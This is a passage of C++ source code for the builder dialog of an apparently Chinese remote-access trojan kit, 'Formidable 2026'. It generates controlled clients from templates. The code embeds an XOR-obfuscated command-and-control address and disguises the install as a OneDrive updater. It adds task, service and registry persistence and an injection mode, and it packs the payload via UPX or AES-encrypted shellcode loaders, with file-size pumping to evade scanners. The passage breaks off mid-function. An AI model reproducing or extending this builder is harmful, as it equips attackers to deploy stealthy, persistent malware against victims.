//================================================================================
// Builder Dialog - Formidable 2026
// 文件: BuilderDialog.cpp
// 说明: 客户端生成器对话框实现
// 编码: UTF-8 BOM
//================================================================================

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include "BuilderDialog.h"
#include "../GlobalState.h"
#include "../NetworkHelper.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../../Common/ClientTypes.h"
#include "../../Common/Utils.h"
#include <CommDlg.h>
#include <CommCtrl.h>
#include <string>
#include <vector>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

// 使用 Windows API 风格的字符串转换，避免 CRT 冲突
static std::string WideToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string result(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, nullptr, nullptr);
    return result;
}

INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        // 设置对话框图标
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_BUILDER)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_BUILDER)));
        
        // EXE类型 Combobox
        HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
        if (hComboExeType) {
            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"Client.exe");
            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"FormidableNim.exe");
            SendMessageW(hComboExeType, CB_SETCURSEL, 0, 0);
        }
        
        // 位数 Combobox
        HWND hComboBits = GetDlgItem(hDlg, IDC_COMBO_BITS);
        if (hComboBits) {
            SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"x86");
            SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"x64");
            SendMessageW(hComboBits, CB_SETCURSEL, 1, 0); // 默认x64
        }
        
        // 运行类型 Combobox
        HWND hComboRunType = GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE);
        if (hComboRunType) {
            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"随机上线");
            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"并发上线");
            SendMessageW(hComboRunType, CB_SETCURSEL, 0, 0);
        }
        
        // 协议 Combobox
        HWND hComboProtocol = GetDlgItem(hDlg, IDC_COMBO_PROTOCOL);
        if (hComboProtocol) {
            SendMessageW(hComboProtocol, CB_ADDSTRING, 0, (LPARAM)L"TCP");
            SendMessageW(hComboProtocol, CB_ADDSTRING, 0, (LPARAM)L"UDP");
            SendMessageW(hComboProtocol, CB_SETCURSEL, 0, 0);
        }
        
        // 加密类型 Combobox
        HWND hComboEncrypt = GetDlgItem(hDlg, IDC_COMBO_ENCRYPT);
        if (hComboEncrypt) {
            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"Shine 加密");
            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"HELL 加密");
            SendMessageW(hComboEncrypt, CB_SETCURSEL, 0, 0);
        }
        
        // 压缩类型 Combobox
        HWND hComboCompress = GetDlgItem(hDlg, IDC_COMBO_COMPRESS);
        if (hComboCompress) {
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"不压缩");
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"UPX 压缩");
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"ShellCode AES");
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"PE->ShellCode");
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"ShellCode AES<Old>");
            SendMessageW(hComboCompress, CB_SETCURSEL, 0, 0);
        }
        
        /*
        // 负载类型 Combobox - 已移除
        HWND hComboPayload = GetDlgItem(hDlg, IDC_COMBO_PAYLOAD);
        if (hComboPayload) {
            SendMessageW(hComboPayload, CB_ADDSTRING, 0, (LPARAM)L"内嵌");
            SendMessageW(hComboPayload, CB_ADDSTRING, 0, (LPARAM)L"下载");
            SendMessageW(hComboPayload, CB_ADDSTRING, 0, (LPARAM)L"远程加载");
            SendMessageW(hComboPayload, CB_SETCURSEL, 0, 0);
        }
        */
        
        // 执行模式 Combobox
        HWND hComboExecModel = GetDlgItem(hDlg, IDC_COMBO_EXECMODEL);
        if (hComboExecModel) {
            SendMessageW(hComboExecModel, CB_ADDSTRING, 0, (LPARAM)L"直接执行");
            SendMessageW(hComboExecModel, CB_ADDSTRING, 0, (LPARAM)L"注入执行");
            SendMessageW(hComboExecModel, CB_SETCURSEL, 0, 0);
        }
        
        // 设置默认值
        SetDlgItemTextW(hDlg, IDC_EDIT_IP, L"127.0.0.1");
        SetDlgItemTextW(hDlg, IDC_EDIT_PORT, std::to_wstring(Formidable::DEFAULT_PORT).c_str());
        SetDlgItemTextW(hDlg, IDC_EDIT_GROUP, L"Default");
        
        // 默认选项
        CheckDlgButton(hDlg, IDC_CHECK_ADMIN, BST_CHECKED);
        // CheckDlgButton(hDlg, IDC_CHECK_STARTUP, BST_CHECKED); // 已废弃，使用具体的自启动选项
        ShowWindow(GetDlgItem(hDlg, IDC_CHECK_STARTUP), SW_HIDE); // 隐藏控件

        CheckDlgButton(hDlg, IDC_CHECK_ENCRYPT_IP, BST_CHECKED);

        // 设置增肥 Slider 范围
        HWND hSlider = GetDlgItem(hDlg, IDC_SLIDER_CLIENT_SIZE);
        if (hSlider) {
            SendMessageW(hSlider, TBM_SETRANGE, TRUE, MAKELONG(0, 100)); // 0-100 MB
            SendMessageW(hSlider, TBM_SETPOS, TRUE, 0);
        }

        // 设置安装目录和程序名称默认值
        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, L"%ProgramData%\\Microsoft OneDrive");
        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, L"OneDrive Update.exe");
        
        ApplyModernTheme(hDlg);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND:
        /*
        if (LOWORD(wParam) == IDC_COMBO_PAYLOAD) {
            if (HIWORD(wParam) == CBN_SELCHANGE) {
                HWND hCombo = (HWND)lParam;
                int index = (int)SendMessageW(hCombo, CB_GETCURSEL, 0, 0);
                // 只有选择"下载"或"远程加载"时才启用下载地址输入
                BOOL enableDownload = (index == 1 || index == 2) || IsDlgButtonChecked(hDlg, IDC_CHECK_FILESERVER);
                EnableWindow(GetDlgItem(hDlg, IDC_EDIT_DOWNLOAD_URL), enableDownload);
            }
            return (INT_PTR)TRUE;
        }
        */
        if (LOWORD(wParam) == IDC_CHECK_FILESERVER) {
            // int index = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PAYLOAD), CB_GETCURSEL, 0, 0);
            int index = 0; // Default to embedded
            BOOL enableDownload = (index == 1 || index == 2) || IsDlgButtonChecked(hDlg, IDC_CHECK_FILESERVER);
            EnableWindow(GetDlgItem(hDlg, IDC_EDIT_DOWNLOAD_URL), enableDownload);
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDC_BTN_BUILD) {
            wchar_t wIP[100], wPort[8], wGroup[24], wInstallDir[MAX_PATH], wInstallName[MAX_PATH], wDownloadUrl[512];
            GetDlgItemTextW(hDlg, IDC_EDIT_IP, wIP, 100);
            GetDlgItemTextW(hDlg, IDC_EDIT_PORT, wPort, 8);
            GetDlgItemTextW(hDlg, IDC_EDIT_GROUP, wGroup, 24);
            GetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, wInstallDir, MAX_PATH);
            GetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, wInstallName, MAX_PATH);
            GetDlgItemTextW(hDlg, IDC_EDIT_DOWNLOAD_URL, wDownloadUrl, 512);

            if (wcslen(wIP) == 0 || wcslen(wPort) == 0) {
                MessageBoxW(hDlg, L"IP和端口不能为空", L"提示", MB_OK | MB_ICONWARNING);
                return (INT_PTR)TRUE;
            }

            std::string ip = WideToUTF8(wIP);
            std::string port = WideToUTF8(wPort);
            std::string group = WideToUTF8(wGroup);
            std::string installDir = WideToUTF8(wInstallDir);
            std::string installName = WideToUTF8(wInstallName);
            std::string downloadUrl = WideToUTF8(wDownloadUrl);
            
            int runTypeIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE), CB_GETCURSEL, 0, 0);
            int protocolIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PROTOCOL), CB_GETCURSEL, 0, 0);
            int encryptIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_ENCRYPT), CB_GETCURSEL, 0, 0);
            int compressIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_COMPRESS), CB_GETCURSEL, 0, 0);
            
            // 映射 UI 索引到 ProtocolEncType
            Formidable::ProtocolEncType encType = Formidable::PROTOCOL_SHINE;
            if (encryptIndex == 1) encType = Formidable::PROTOCOL_HELL;
            
            // 映射 UI 索引到 ClientCompressType
            Formidable::ClientCompressType compressType = Formidable::CLIENT_COMPRESS_NONE;
            switch (compressIndex) {
            case 1: compressType = Formidable::CLIENT_COMPRESS_UPX; break;
            case 2: compressType = Formidable::CLIENT_COMPRESS_SC_AES; break;
            case 3: compressType = Formidable::CLIENT_PE_TO_SEHLLCODE; break;
            case 4: compressType = Formidable::CLIENT_COMPRESS_SC_AES_OLD; break;
            }
            
            // int payloadIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PAYLOAD), CB_GETCURSEL, 0, 0);
            int payloadIndex = 0; // Default to embedded
            
            bool runAsAdmin = (IsDlgButtonChecked(hDlg, IDC_CHECK_ADMIN) == BST_CHECKED);
            // bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED); // 已废弃
            bool taskStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_TASK_STARTUP) == BST_CHECKED);
            bool serviceStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_SERVICE_STARTUP) == BST_CHECKED);
            bool registryStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_REGISTRY_STARTUP) == BST_CHECKED);
            int bitsIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_BITS), CB_GETCURSEL, 0, 0);
            bool is64Bit = (bitsIndex == 1);
            bool encryptIp = (IsDlgButtonChecked(hDlg, IDC_CHECK_ENCRYPT_IP) == BST_CHECKED);
            int pumpSize = (int)SendMessageW(GetDlgItem(hDlg, IDC_SLIDER_CLIENT_SIZE), TBM_GETPOS, 0, 0);

            // 如果选择了 Both，则忽略 is64Bit 手动选择的结果，直接循环两次
            /*
            if (buildBoth) {
                // ... logic for both handled by BuildOne callers
            }
            */

            // 获取选择的 EXE 类型
            HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
            int idxExeType = (int)SendMessageW(hComboExeType, CB_GETCURSEL, 0, 0);

            // 设置默认生成的文件名
            wchar_t szSavePath[MAX_PATH];
            if (idxExeType == 1) {
                wcscpy_s(szSavePath, L"FormidableNim.exe");
            } else {
                wcscpy_s(szSavePath, L"Client.exe");
            }

            OPENFILENAMEW ofn = { 0 };
            ofn.lStructSize = sizeof(ofn);
            ofn.hwndOwner = hDlg;
            
            ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
            ofn.lpstrDefExt = L"exe";

            ofn.lpstrFile = szSavePath;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;
            ofn.lpstrTitle = L"保存客户端 (这是生成的客户端文件名)";

            if (!GetSaveFileNameW(&ofn)) return (INT_PTR)TRUE;

            std::wstring baseSavePath = szSavePath;
            
            // 辅助函数：查找模板文件
            auto FindTemplateFile = [&](const std::wstring& fileName, bool targetX64) -> std::wstring {
                wchar_t szExePath[MAX_PATH];
                GetModuleFileNameW(NULL, szExePath, MAX_PATH);
                std::wstring currentDir = szExePath;
                currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
                
                std::vector<std::wstring> candidates;
                
                // 1. 当前目录
                candidates.push_back(currentDir + L"\\" + fileName);
                
                // 2. 目标架构目录 (相对当前目录)
                if (targetX64) {
                    candidates.push_back(currentDir + L"\\x64\\" + fileName);
                    candidates.push_back(currentDir + L"\\..\\x64\\" + fileName);
                    candidates.push_back(currentDir + L"\\..\\Formidable2026\\x64\\" + fileName);
                } else {
                    candidates.push_back(currentDir + L"\\x86\\" + fileName);
                    candidates.push_back(currentDir + L"\\..\\x86\\" + fileName);
                    candidates.push_back(currentDir + L"\\..\\Formidable2026\\x86\\" + fileName);
                }

                // 3. 兄弟架构目录 (如果当前在 x86，找 x64，反之亦然)
                candidates.push_back(currentDir + L"\\..\\x86\\" + fileName);
                candidates.push_back(currentDir + L"\\..\\x64\\" + fileName);
                
                // 4. 源码结构默认输出路径 (硬编码兜底)
                // 假设当前在 Master/Debug 或 Master/Release，输出目录在 $(SolutionDir)Formidable2026\x86
                candidates.push_back(currentDir + L"\\..\\..\\Formidable2026\\x86\\" + fileName);
                candidates.push_back(currentDir + L"\\..\\..\\Formidable2026\\x64\\" + fileName);
                candidates.push_back(currentDir + L"\\..\\..\\x86\\" + fileName);
                candidates.push_back(currentDir + L"\\..\\..\\x64\\" + fileName);
                
                // 5. 移除硬编码路径，使用更灵活的相对路径查找
                // 向上查找可能的构建输出目录
                std::wstring searchDir = currentDir;
                for (int i = 0; i < 4; ++i) { // 最多向上查找4层
                    size_t lastSlash = searchDir.find_last_of(L"\\/");
                    if (lastSlash == std::wstring::npos) break;
                    searchDir = searchDir.substr(0, lastSlash);
                    
                    if (targetX64) {
                        candidates.push_back(searchDir + L"\\Formidable2026\\x64\\" + fileName);
                        candidates.push_back(searchDir + L"\\x64\\" + fileName);
                        candidates.push_back(searchDir + L"\\bin\\x64\\" + fileName); // 常见的 bin 目录结构
                    } else {
                        candidates.push_back(searchDir + L"\\Formidable2026\\x86\\" + fileName);
                        candidates.push_back(searchDir + L"\\x86\\" + fileName);
                        candidates.push_back(searchDir + L"\\bin\\x86\\" + fileName);
                    }
                }

                for (const auto& path : candidates) {
                    if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        return path;
                    }
                }
                return L"";
            };

            auto BuildOne = [&](bool x64, const std::wstring& dest) -> bool {
                std::vector<char> buffer;
                
                // 获取选择的 EXE 类型
                HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
                int idxExeTypeSelected = (int)SendMessageW(hComboExeType, CB_GETCURSEL, 0, 0);
                bool isNim = (idxExeTypeSelected == 1);

                // 尝试从资源加载 (C++和Nim版都支持)
                int resId = 0;
                if (isNim) {
                    resId = x64 ? IDR_NIM_CLIENT_EXE_X64 : IDR_NIM_CLIENT_EXE_X86;
                } else {
                    resId = x64 ? IDR_CLIENT_EXE_X64 : IDR_CLIENT_EXE_X86;
                }

                if (resId != 0) {
                    GetResourceData(resId, buffer);
                }

                // 如果资源加载失败或为空，则尝试从外部文件加载
                if (buffer.empty()) {
                    if (isNim) {
                        // Nim 版被控端外部文件加载逻辑
                        std::wstring fileName = L"FormidableNim.exe";
                        std::wstring templatePath = FindTemplateFile(fileName, x64);
                        
                        // 如果没找到，尝试带 _Debug 后缀的 (Nim 编译常带)
                        if (templatePath.empty()) {
                            templatePath = FindTemplateFile(L"FormidableNim_Debug.exe", x64);
                        }
                        
                        if (!templatePath.empty()) {
                            HANDLE hFile = CreateFileW(templatePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                DWORD size = GetFileSize(hFile, NULL);
                                buffer.resize(size);
                                DWORD read;
                                ReadFile(hFile, buffer.data(), size, &read, NULL);
                                CloseHandle(hFile);
                            }
                        }
                    } else {
                        // C++ 版被控端外部文件加载逻辑
                        std::wstring fileName = L"Client.exe";
                        std::wstring templatePath = FindTemplateFile(fileName, x64);
                        
                        if (!templatePath.empty()) {
                            HANDLE hFile = CreateFileW(templatePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                DWORD size = GetFileSize(hFile, NULL);
                                buffer.resize(size);
                                DWORD read;
                                ReadFile(hFile, buffer.data(), size, &read, NULL);
                                CloseHandle(hFile);
                            }
                        } 
                    }
                }

                if (buffer.empty()) {
                    std::wstring fileName = isNim ? L"FormidableNim.exe" : L"Client.exe";
                    std::wstring msg = L"无法找到模板文件: " + fileName + (isNim ? L" (或 FormidableNim_Debug.exe)" : L"") + L"\n请确认已编译被控端项目。\n架构: " + (x64 ? L"x64" : L"x86");
                    MessageBoxW(hDlg, msg.c_str(), L"错误", MB_ICONERROR);
                    return false;
                }

                bool found = false;
                DWORD dwSize = (DWORD)buffer.size();
                
                if (dwSize < sizeof(Formidable::CONNECT_ADDRESS)) {
                    MessageBoxW(hDlg, L"模板文件或资源大小无效（过小），无法进行配置注入。", L"错误", MB_ICONERROR);
                    return false;
                }

                // 搜索特征码 "FRMD26_CONFIG"
                const char* flag = "FRMD26_CONFIG";
                size_t flagLen = strlen(flag);
                
                // 使用安全的边界检查，防止 size_t 下溢
                size_t searchLimit = dwSize - sizeof(Formidable::CONNECT_ADDRESS);
                for (size_t i = 0; i <= searchLimit; i++) {
                    if (memcmp(buffer.data() + i, flag, flagLen) == 0) {
                        Formidable::CONNECT_ADDRESS* pAddr = (Formidable::CONNECT_ADDRESS*)(buffer.data() + i);
                        
                        // 彻底清空结构体（除了标识符）
                        memset(pAddr->szServerIP, 0, sizeof(pAddr->szServerIP));
                        memset(pAddr->szPort, 0, sizeof(pAddr->szPort));
                        memset(pAddr->szGroupName, 0, sizeof(pAddr->szGroupName));
                        memset(pAddr->szInstallDir, 0, sizeof(pAddr->szInstallDir));
                        memset(pAddr->szInstallName, 0, sizeof(pAddr->szInstallName));
                        memset(pAddr->szDownloadUrl, 0, sizeof(pAddr->szDownloadUrl));
                        
                        // 填入配置
                        pAddr->iHeaderEnc = static_cast<int>(encType);
                        pAddr->iStartup = static_cast<int>(compressType);

                        if (encryptIp) {
                            std::string finalIp = ip;
                            for (size_t k = 0; k < finalIp.length(); k++) {
                                finalIp[k] ^= 0x5A; // 简单的异或加密
                            }
                            // 对于加密数据，必须使用 memcpy 以免被 null 截断
                            size_t copyLen = (finalIp.length() < sizeof(pAddr->szServerIP) - 1) ? finalIp.length() : sizeof(pAddr->szServerIP) - 1;
                            memcpy(pAddr->szServerIP, finalIp.c_str(), copyLen);
                            pAddr->szServerIP[copyLen] = '\0';
                        } else {
                            strncpy_s(pAddr->szServerIP, sizeof(pAddr->szServerIP), ip.c_str(), _TRUNCATE);
                        }
                        
                        strncpy_s(pAddr->szPort, sizeof(pAddr->szPort), port.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szGroupName, sizeof(pAddr->szGroupName), group.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szInstallDir, sizeof(pAddr->szInstallDir), installDir.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szInstallName, sizeof(pAddr->szInstallName), installName.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szDownloadUrl, sizeof(pAddr->szDownloadUrl), downloadUrl.c_str(), _TRUNCATE);
                        
                        pAddr->bEncrypt = encryptIp ? 1 : 0;
                        pAddr->iHeaderEnc = encryptIndex;
                        pAddr->iStartup = compressIndex; // 借用 iStartup 存储压缩/加壳方式，或者在 CONNECT_ADDRESS 中增加字段
                        pAddr->runasAdmin = (char)(runAsAdmin ? 1 : 0);
                        pAddr->taskStartup = (char)(taskStartup ? 1 : 0);
                        pAddr->serviceStartup = (char)(serviceStartup ? 1 : 0);
                        pAddr->registryStartup = (char)(registryStartup ? 1 : 0);
                        pAddr->iPumpSize = pumpSize;
                        pAddr->runningType = (char)runTypeIndex;
                        pAddr->protoType = (char)protocolIndex;
                        pAddr->payloadType = (char)payloadIndex;
                        
                        found = true;
                        // 不 break，继续搜索以防有多个备份（虽然通常只有一个）
                    }
                }
                if (!found) {
                     MessageBoxW(hDlg, L"模板文件中未找到配置特征码 FRMD26_CONFIG，请确认模板是否最新。", L"错误", MB_ICONERROR);
                     return false;
                }

                // 写入临时文件或目标文件
                if (compressIndex == 1) { // UPX
                    wchar_t szTempPath[MAX_PATH], szTempFile[MAX_PATH];
                    GetTempPathW(MAX_PATH, szTempPath);
                    GetTempFileNameW(szTempPath, L"FRM", 0, szTempFile);
                    
                    HANDLE hFile = CreateFileW(szTempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD written;
                        WriteFile(hFile, buffer.data(), dwSize, &written, NULL);
                        CloseHandle(hFile);
                        
                        // 获取当前程序目录
                        wchar_t szModulePath[MAX_PATH];
                        GetModuleFileNameW(NULL, szModulePath, MAX_PATH);
                        std::wstring baseDir = szModulePath;
                        baseDir = baseDir.substr(0, baseDir.find_last_of(L"\\/"));
                        
                        // 尝试在多个可能的位置寻找 UPX
                        std::vector<std::wstring> upxPaths;
                        if (x64) {
                            upxPaths.push_back(baseDir + L"\\upx64.exe");
                            upxPaths.push_back(baseDir + L"\\thirdparty\\Bin\\upx64.exe");
                            upxPaths.push_back(baseDir + L"\\..\\thirdparty\\Bin\\upx64.exe");
                            upxPaths.push_back(baseDir + L"\\..\\..\\thirdparty\\Bin\\upx64.exe");
                        } else {
                            upxPaths.push_back(baseDir + L"\\upx32.exe");
                            upxPaths.push_back(baseDir + L"\\thirdparty\\Bin\\upx32.exe");
                            upxPaths.push_back(baseDir + L"\\..\\thirdparty\\Bin\\upx32.exe");
                            upxPaths.push_back(baseDir + L"\\..\\..\\thirdparty\\Bin\\upx32.exe");
                        }
                        upxPaths.push_back(baseDir + L"\\upx.exe");
                        upxPaths.push_back(baseDir + L"\\thirdparty\\Bin\\upx.exe");
                        upxPaths.push_back(baseDir + L"\\..\\thirdparty\\Bin\\upx.exe");
                        upxPaths.push_back(baseDir + L"\\..\\..\\thirdparty\\Bin\\upx.exe");

                        std::wstring upxExe;
                        for (const auto& path : upxPaths) {
                            if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                                upxExe = path;
                                break;
                            }
                        }

                        if (!upxExe.empty()) {
                            // 修复：确保目标路径 dest 也有引号处理，防止空格导致失败
                            std::wstring cmd = L"\"" + upxExe + L"\" -9 \"" + szTempFile + L"\" -o \"" + dest + L"\"";
                            
                            STARTUPINFOW si = { sizeof(si) };
                            PROCESS_INFORMATION pi = { 0 };
                            si.dwFlags = STARTF_USESHOWWINDOW;
                            si.wShowWindow = SW_HIDE;
                            
                            if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                                WaitForSingleObject(pi.hProcess, 30000);
                                DWORD exitCode = 0;
                                GetExitCodeProcess(pi.hProcess, &exitCode);
                                CloseHandle(pi.hProcess);
                                CloseHandle(pi.hThread);
                                DeleteFileW(szTempFile);

                                if (exitCode == 0) {
                                    goto PUMP_SECTION; // 压缩成功，跳转到增肥环节
                                }
                            }
                        }
                        DeleteFileW(szTempFile);
                    }
                } else if (compressIndex == 2) { // ShellCode AES
                    LPBYTE shellcodeBuffer = NULL;
                    int shellcodeSize = 0;
                    if (Formidable::MakeShellcode(shellcodeBuffer, shellcodeSize, (LPBYTE)buffer.data(), (DWORD)buffer.size(), true)) {
                        Formidable::SCInfo sc;
                        memset(&sc, 0, sizeof(sc));
                        Formidable::generate_random_iv(sc.aes_key, 16);
                        Formidable::generate_random_iv(sc.aes_iv, 16);
                        
                        // 使用 BCrypt 加密
                        BCRYPT_ALG_HANDLE hAlg = NULL;
                        BCRYPT_KEY_HANDLE hKey = NULL;
                        DWORD cbKeyObject = 0, cbBlockLen = 0, cbData = 0;
                        PBYTE pbKeyObject = NULL, pbIV = NULL;
                        
                        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
                            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
                            BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
                            pbKeyObject = (PBYTE)malloc(cbKeyObject);
                            BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0);
                            pbIV = (PBYTE)malloc(cbBlockLen);
                            memcpy(pbIV, sc.aes_iv, 16);
                            
                            if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, sc.aes_key, 16, 0) == 0) {
                                DWORD encryptedSize = 0;
                                BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, NULL, 0, &encryptedSize, BCRYPT_BLOCK_PADDING);
                                LPBYTE encryptedBuffer = (LPBYTE)malloc(encryptedSize);
                                memcpy(pbIV, sc.aes_iv, 16);
                                if (BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, encryptedBuffer, encryptedSize, &encryptedSize, BCRYPT_BLOCK_PADDING) == 0) {
                                    sc.len = encryptedSize;
                                    sc.data = encryptedBuffer;
                                    
                                    // 加载 Loader 资源
                                     std::vector<char> loaderBuffer;
                                     GetResourceData(x64 ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, loaderBuffer);
                                     if (!loaderBuffer.empty()) {
                                         // 注入配置
                                        const char* scFlag = "FormidableStub";
                                        size_t scFlagLen = strlen(scFlag);
                                        bool scFound = false;

                                        if (loaderBuffer.size() >= sizeof(Formidable::SCInfo)) {
                                            size_t searchLimit = loaderBuffer.size() - sizeof(Formidable::SCInfo);
                                            for (size_t i = 0; i <= searchLimit; i++) {
                                                if (memcmp(loaderBuffer.data() + i, scFlag, scFlagLen) == 0) {
                                                    memcpy(loaderBuffer.data() + i, &sc, sizeof(Formidable::SCInfo));
                                                    scFound = true;
                                                    break;
                                                }
                                            }
                                        }
                                        
                                        if (scFound) {
                                            // 将加密后的 Shellcode 追加到 Loader 后面
                                            sc.offset = (int)loaderBuffer.size();
                                            // 重新写入 offset
                                            if (loaderBuffer.size() >= sizeof(Formidable::SCInfo)) {
                                                size_t searchLimit = loaderBuffer.size() - sizeof(Formidable::SCInfo);
                                                for (size_t i = 0; i <= searchLimit; i++) {
                                                    if (memcmp(loaderBuffer.data() + i, &sc.aes_key, 16) == 0) {
                                                        ((Formidable::SCInfo*)(loaderBuffer.data() + i))->offset = sc.offset;
                                                        break;
                                                    }
                                                }
                                            }
                                            
                                            HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                            if (hFile != INVALID_HANDLE_VALUE) {
                                                DWORD written;
                                                WriteFile(hFile, loaderBuffer.data(), (DWORD)loaderBuffer.size(), &written, NULL);
                                                WriteFile(hFile, sc.data, sc.len, &written, NULL);
                                                CloseHandle(hFile);
                                                free(encryptedBuffer);
                                                BCryptDestroyKey(hKey);
                                                free(pbKeyObject);
                                                free(pbIV);
                                                BCryptCloseAlgorithmProvider(hAlg, 0);
                                                delete[] shellcodeBuffer;
                                                goto PUMP_SECTION;
                                            }
                                        }
                                    }
                                    free(encryptedBuffer);
                                }
                                BCryptDestroyKey(hKey);
                            }
                            free(pbKeyObject);
                            free(pbIV);
                            BCryptCloseAlgorithmProvider(hAlg, 0);
                        }
                        delete[] shellcodeBuffer;
                    }
                } else if (compressIndex == 3) { // PE->ShellCode
                    LPBYTE shellcodeBuffer = NULL;
                    int shellcodeSize = 0;
                    if (Formidable::MakeShellcode(shellcodeBuffer, shellcodeSize, (LPBYTE)buffer.data(), (DWORD)buffer.size(), true)) {
                        HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD written;
                            WriteFile(hFile, shellcodeBuffer, shellcodeSize, &written, NULL);
                            CloseHandle(hFile);
                            delete[] shellcodeBuffer;
                            goto PUMP_SECTION;
                        }
                        delete[] shellcodeBuffer;
                    }
                } else if (compressIndex == 4) { // ShellCode AES<Old>
                    LPBYTE shellcodeBuffer = NULL;
                    int shellcodeSize = 0;
                    if (Formidable::MakeShellcode(shellcodeBuffer, shellcodeSize, (LPBYTE)buffer.data(), (DWORD)buffer.size(), true)) {
                        auto scPtr = std::make_unique<Formidable::SCInfoOld>();
                        Formidable::SCInfoOld& sc = *scPtr;
                        memset(&sc, 0, sizeof(sc));
                        Formidable::generate_random_iv(sc.aes_key, 16);
                        Formidable::generate_random_iv(sc.aes_iv, 16);
